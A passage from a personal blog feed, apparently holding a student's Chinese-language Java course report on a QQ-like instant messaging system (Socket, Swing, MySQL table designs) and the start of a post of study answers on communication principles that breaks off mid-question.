功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="https://shierjinghuang.github.io/2023/03/18/Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;即时通讯系统&quot;&gt;&lt;a href=&quot;#即时通讯系统&quot; class=&quot;headerlink&quot; title=&quot;即时通讯系统&quot;&gt;&lt;/a&gt;即时通讯系统&lt;/h2&gt;&lt;h3 id=&quot;1-系统概述&quot;&gt;&lt;a href=&quot;#1-系统概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="个人" scheme="https://shierjinghuang.github.io/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="Java" scheme="https://shierjinghuang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>通信原理思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-09T07:25:00.000Z</published>
    <updated>2023-03-12T01:07:51.970Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a><strong>第一章</strong></h5><p>1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?</p><blockquote><p>有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量</p></blockquote><p><font color="blue">1-12何谓是码元速率和信息速率?他们之间的关系如何?</font></p><blockquote><p>码元速率定义为单位时间里传输码元的个数，单位为波特(Baud)，信息速率定义为单位时间传输的比特数，单位是bit/s</p><p>码元速率在数值上小于等于信息速率。码元速率决定了发送信号所需的传输带宽。</p></blockquote><p>1-13何谓误码率和误信率?它们之间关系如何?</p><ul><li>误码率是指错误接收的码元数在传输总码元数中所占的比例  Pe=错误码元数/传输总码元数</li><li>误信率是指错误接收的比特数在传输总比特数中所占得比例  Pb=错误比特数/传输总比特数</li><li>它们是描述差错率的两种不同表述，在二进制中，二者数值相等</li></ul><h5 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a><strong>第二章</strong></h5><p>确知信号按照其强度可以分为能量信号和功率信号。功率信号按照其有无周期性划分，可以分为周期性信号和非周期性信号。</p><p>2-1何为确知信号?</p><blockquote><p>确知信号是指其取值在任何时间都是确定的和预知的信号</p></blockquote><p>2-2试分别说明能量信号和功率信号的特性?</p><blockquote><p>能量信号的其能量为有限的正值，但其功率等于零;功率信号其能量近似等于无穷大，其平均功率为有限值</p></blockquote><h5 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a><strong>第三章</strong></h5><p>随机过程的定义</p><p>定义一:<strong>随机过程是所有样本函数的集合</strong>，定义二:<strong>随机过程看作是在时间进程中处于不同时刻的随机变量的集合</strong></p><p>随机过程的统计特性由其分布函数或概率密度函数描述。</p><p>什么是各态历经性过程？</p><blockquote><p>随机过程中的任何一次实现都经历了随机过程的所有可能状态<font color="blue">（一个随机过程的所有样本函数都服从同一分布）</font></p></blockquote><ul><li>与平稳过程关系：具有各态历经性的过程一定是平稳随机过程，反之不一定成立</li></ul><p>3-1    何谓随机过程?它具有什么特点?</p><blockquote><p>随机过程是一类随时间随机变化的过程，他不能用确切的函数来表示。特点：1是对应不同随机试验结果的时间过程的集合，2是随机变量概念的延伸</p></blockquote><p>3-3    何谓严平稳?何谓广义平稳?他们之间的关系如何?</p><ul><li>严平稳:        若一个随机过程的统计特性与时间起点无关，时间平移不影响其任何统计特性</li><li>广义平稳:    均值与时间无关为常数，自相关函数只与时间间隔有关</li><li><font color="blue">关系:           若一个一般随机过程是严平稳随机过程，则它一定是广义平稳随机过程，反之不一定成立。若一个高斯过程，则严平稳随机过程与广义平稳随机过程等价。</font></li></ul><p>3-4    平稳过程的自相关函数有哪些性质?他与功率谱密度的关系如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)平稳随机过程的自然相关函数与时间起点无关，只与时间间隔有关，而且是偶函数。(2) 平稳随机过程的功率谱密度与其自相关函数是一对傅里叶变换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235304920.png" alt="image-20221214235304920" style="zoom:50%;" /> </center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235400829.png" alt="image-20221214235400829" style="zoom:50%;" /><p>3-5    什么是高斯过程，其主要性质有哪些?</p><blockquote><p>如果随机过程的任意的n维分布均服从正态分布，则称它为正态过程或高斯过程</p></blockquote><ol><li>高斯过程的n维分布只依赖于各个随机变量的均值，方差和归一化协方差;</li><li>广义平稳的高斯过程也是严平稳;</li><li>如果高斯过程在不同时刻的取值是不相关的，那么他们也是统计独立的;</li><li>高斯过程经过线性变换后仍然是高斯过程</li></ol><p>3-12    什么是白噪声?其频谱和自相关函数有什么特点?白噪声通过理想低通或理想带通滤波器后的情况如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)噪声的功率谱密度在所有与频率上均为常数则称为白噪声;(2)频谱为一常数，自相关函数只在R(0)处为0 ;(3)通过理想低通或理想带通滤波器后分别变成低通白噪声或带通白噪声<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235802823.png" alt="image-20221214235802823" style="zoom:50%;" /></center>3-13    何为高斯白噪声?它的概率密度函数、功率频谱密度如何表示?<blockquote><p>如果白噪声取值的概率密度分布服从高斯分布，则称之为高斯白噪声;其概率密度函数为高斯函数，其功率谱密度为常数</p></blockquote><p>3-13补充：什么是高斯噪声?它们各有什么特点?性质？P45</p><blockquote><p>高斯噪声:概率密度函数符合正态分布的噪声。</p></blockquote><blockquote><p>高斯噪声的特点:它的n维分布仅由各随机变量的数学期望、方差和两两之间的归一化协方差函数决定。若高斯噪声是宽平稳，则也是严平稳的。若随机变量之间互不相关，则也是统计独立的</p></blockquote><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000148202.png" alt="image-20221215000148202" style="zoom:50%;" /> <h5 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a><strong>第四章</strong></h5><p>按照传输媒质的不同分为：无线信道（自由空间或大气层）和有线信道（明线、电缆、光纤）</p><p>无线信道按照传播方式区分，包括地波、天波和视线传播三种。</p><p>有线信道分为有线电信道和有线光信道两大类</p><p>信道的数学模型分为调制信道模型和编码信道模型两类。</p><p>香农公式？<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000533207.png" alt="image-20221215000533207" style="zoom:50%;" /></p><p>4-6    何为多径效应?</p><blockquote><p>多径传播对信号的影响称为多径效应。多径传播指信号信号经过几条路径到达接收端，而且每条路径的长度（时延）和衰减都随着时间而变。</p></blockquote><p>4-8    何谓恒参信道，何谓随参信道，他们分别对信号传输有哪些主要影响?</p><pre class="line-numbers language-none"><code class="language-none">信道特性基本上不随时间变化或者变化很慢称为恒参信道;信道特性随机变化的信道称为随参信道;（乘性干扰随机变化的信道称为随参信道；乘性干扰基本保持恒定的信道称为恒参信道）恒参信道对信号传输的影响可以完全消除,而随参信道对信号传输的影响只能在统计平均的意义下消除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4-9    何谓加性干扰，何谓乘性干扰?</p><blockquote><p>信道中的噪声 n(t)是叠加在信号上的，而无论有无信号，噪声n(t)是始终存在的，该n(t)称加性干扰。<br>信道的作用相当于对输入信号乘一个系数k(t)，该k(t)可看作是对信号的一种干扰，k(t)称为乘性干扰。</p><blockquote><p>无论信号有无都存在的噪声称为加性干扰;随信号大小变化的干扰称为乘性千扰<del>(这个是原答案)</del></p></blockquote></blockquote><p>4-17    试述信道容量的定义?</p><blockquote><p>信道容量是指信道能够传输的最大平均信息量</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215001532071.png" alt="image-20221215001532071" style="zoom:67%;" /> <h5 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a><strong>第五章</strong></h5><p>模拟调制分为：幅度调制和角度调制</p><ul><li><p>幅度调制包括：调幅AM、双边带DSB、单边带SSB、残留边带VSB调制</p><ul><li>所占带宽、特点、调制效率(功率利用率)</li><li>调幅AM特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003003169.png" alt="image-20221215003003169" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003100632.png" alt="image-20221215003100632" style="zoom: 33%;" /></li><li>双边带DSB特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003417004.png" alt="image-20221215003417004" style="zoom: 33%;" /></li><li>单边带SSB：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003509942.png" alt="image-20221215003509942" style="zoom:33%;" /></li><li>残留边带VSB调制：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003542088.png" alt="image-20221215003542088" style="zoom:33%;" /></li></ul><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003706914.png" alt="image-20221215003706914" style="zoom: 33%;" /> </center><center>P122页表格</center></li><li><p>角度调制分为：调频FM和调相PM</p></li></ul><p>线性调制的通用模型：滤波法和相移法</p><p>解调方法：相干解调和非相干解调</p><p>5-1    何为调制?调制在通信系统中的作用是什么?</p><pre class="line-numbers language-none"><code class="language-none">调制:把信号转换成适合在信道中传输的形式的一种过程（按调制信号的变化规律去控制载波的某个参数的过程，书上解释）作用:频谱搬移;实现信道的多路复用;扩展信号带宽,提高系统的抗干扰能力、抗衰落能力，还可实现传输带宽与信噪比之间的互换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5-2    什么是线性调制?常见的线性调制有哪些?</p><blockquote><p>正弦载波的幅度随调制信号做线性变化的过程。从频谱上说，已调信号的频谱结构与基带信号的频谱结构相同，只是频率位置发生变化。</p></blockquote><blockquote><p>常见的线性调制有调幅（AM)、双边带调制(DSB)、单边带调制(SSB)和残留边带调制(VSB)</p></blockquote><p>5-5    为什么要抑制载波?相对AM信号来说，抑制载波的双边带信号可以增加多少功效?</p><blockquote><p>抑制载波可以提高调制效率；对于抑制载波的双边带，可以使其调制效率由1/3提高到1</p></blockquote><p>5-9    DSB调制系统和SSB调制系统的抗噪声性能是否相同，为什么?</p><blockquote><p>相同，如果解调器的输入噪声功率密度相同，输入信号功率也相同，则单边带和双边带解调器输出的信噪比是相等的</p></blockquote><h5 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a><strong>第六章</strong></h5><p>6-4    构成AMI码和HDB3码的规则是什么?它们各有什么优缺点?</p><blockquote><p>AMI的编码规则:将消息代码0（空号）仍然变换成传输码0，而把1(传码）交替的变换为传输码的+1，-1…。因此AMI码为三电平序列，三元码，伪三进制，1B/1T码。</p></blockquote><ul><li>AMI的优点:0,1不等概率是也无直流；零频附近的低频分量小；整流后即RZ码；编译码电路简单而且便于观察误码情况</li><li>AMI的缺点是:连续0码多时，RZ码连0也多，不利于提取高质量的位同步信号</li></ul><blockquote><p>HDB3的编码规则:先把消息代码变换AMI码，然后去检查AMI码的连零情况，没有四个或者四个以上的连零串时,这时的AMI码就是HDB3码;当出现四个或者四个以上的连零串时，将四个连零小段的第四个0变换于迁移非0符号同极性的符号，称为v符号（破坏码)。当相邻V符号之间有偶数个非零符号时，再将该小段的第一个0变成+B或者-B（平衡码)，B符号的极性与前一非零符号的极性相反，并让后面的非О符号从V符号开始再交替变化。</p></blockquote><p>HDB3码的优点:保持了AMl的优点，还增加了使连零串减少到至多三个，对于定时信号的恢复是十分有利的。</p><p>6-6    什么是码间串扰?它是如何产生的?对通信质量有什么影响?</p><pre class="line-numbers language-none"><code class="language-none">(1)码间串扰:由于系统的总特性不理想，导致前后码元的波形畸变、展宽，并使前面的波形出现很长的拖尾，蔓延到当前码元的抽样时刻，从而对当前码元的判决造成干扰(2)码间干扰的产生是因为在第k个抽样时刻理想状态时抽样时刻所得的是仅有第k个波形在此时刻被取值，但在实际系统中，会有除了第k个波形以外的波形可能再抽样时刻被取值。码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降(3)码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6-7     